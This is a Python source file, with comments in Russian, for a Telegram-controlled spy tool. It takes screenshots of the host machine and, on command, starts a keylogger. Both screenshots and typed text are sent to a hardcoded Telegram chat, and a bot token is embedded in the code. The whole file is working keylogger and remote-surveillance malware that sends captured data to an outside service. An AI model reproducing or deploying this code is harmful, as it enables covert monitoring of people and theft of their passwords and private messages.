import logging
import pyautogui
import tempfile
import telebot
from telebot import types
import subprocess
import sys
from pynput import keyboard

# Настройки Telegram
TELEGRAM_TOKEN = '7457968994:AAGDFQHE2Mjw_-qHziGVI_Njm4PY7n9sSQc'
CHAT_ID = '1859496226'

bot = telebot.TeleBot(TELEGRAM_TOKEN)
log = ""
send_interval = 10  # Интервал отправки сообщений в секундах
is_translating = False  # Глобальная переменная для отслеживания состояния трансляции клавиатуры
listener = None  # Переменная для хранения объекта Listener

# Функция для создания скриншота и отправки его в Telegram
@bot.message_handler(commands=['get_screenshot'])
def get_screenshot(message):
    try:
        path = tempfile.gettempdir() + '/screenshot.png'
        pyautogui.screenshot(path)
        
        with open(path, 'rb') as photo:
            bot.send_photo(CHAT_ID, photo)
    except Exception as e:
        logging.error(f"Error getting and sending screenshot: {e}")

# Обработчик для кнопки "Получить скриншот"
@bot.message_handler(func=lambda message: message.text == "Получить скриншот")
def handle_get_screenshot_button(message):
    try:
        path = tempfile.gettempdir() + '/screenshot.png'
        pyautogui.screenshot(path)
        
        with open(path, 'rb') as photo:
            bot.send_photo(CHAT_ID, photo)
    except Exception as e:
        logging.error(f"Error getting and sending screenshot: {e}")

# Обработчик для кнопки "Перезапустить"
@bot.message_handler(func=lambda message: message.text == "Перезапустить")
def handle_restart_button(message):
    try:
        bot.send_message(CHAT_ID, "Перезапускаю приложение...")

        python = sys.executable
        subprocess.Popen([python] + sys.argv)
        sys.exit()
    except Exception as e:
        logging.error(f"Error restarting application: {e}")

# Обработчик для кнопки "Трансляция клавиатуры"
@bot.message_handler(func=lambda message: message.text == "Трансляция клавиатуры")
def handle_keyboard_translation(message):
    global is_translating
    try:
        if not is_translating:
            is_translating = True
            bot.send_message(CHAT_ID, "Начата трансляция клавиатуры.")
            start_keyboard_translation()
        else:
            bot.send_message(CHAT_ID, "Трансляция клавиатуры уже запущена.")
    except Exception as e:
        logging.error(f"Error handling keyboard translation: {e}")

# Обработчик для кнопки "Стоп"
@bot.message_handler(func=lambda message: message.text == "Стоп")
def handle_stop_translation(message):
    global is_translating, listener
    try:
        if is_translating and listener:
            listener.stop()
            listener = None
            is_translating = False
            # Восстанавливаем изначальные кнопки
            restore_initial_buttons()
            bot.send_message(CHAT_ID, "Трансляция клавиатуры остановлена.")
        else:
            bot.send_message(CHAT_ID, "Трансляция клавиатуры не активна.")
    except Exception as e:
        logging.error(f"Error stopping keyboard translation: {e}")

def start_keyboard_translation():
    global listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Отправляем сообщение с клавиатурной разметкой, включая кнопку "Стоп"
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton(text="Стоп"))
    bot.send_message(CHAT_ID, "Трансляция клавиатуры активирована.", reply_markup=markup)

def on_press(key):
    global log
    try:
        if key == keyboard.Key.esc:
            if log:  # если log не пустой, отправляем его в чат
                bot.send_message(CHAT_ID, log)
            log = ""  # очищаем log после отправки
        elif key == keyboard.Key.enter:
            if log:  # если log не пустой, отправляем его в чат
                bot.send_message(CHAT_ID, log)
            log = ""  # очищаем log после отправки
        else:
            log += key.char  # добавляем символ к log
    except Exception as e:
        logging.error(f"Error sending keyboard input: {e}")

def restore_initial_buttons():
    # Восстанавливаем изначальные кнопки
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton(text="Получить скриншот"))
    markup.add(types.KeyboardButton(text="Перезапустить"))
    bot.send_message(CHAT_ID, "Выберите действие:", reply_markup=markup)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)

    # Создаем клавиатурную разметку с кнопками "Получить скриншот", "Перезапустить" и "Трансляция клавиатуры"
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton(text="Получить скриншот"))
    markup.add(types.KeyboardButton(text="Перезапустить"))

    bot.send_message(CHAT_ID, "Выберите действие:", reply_markup=markup)

    bot.polling()
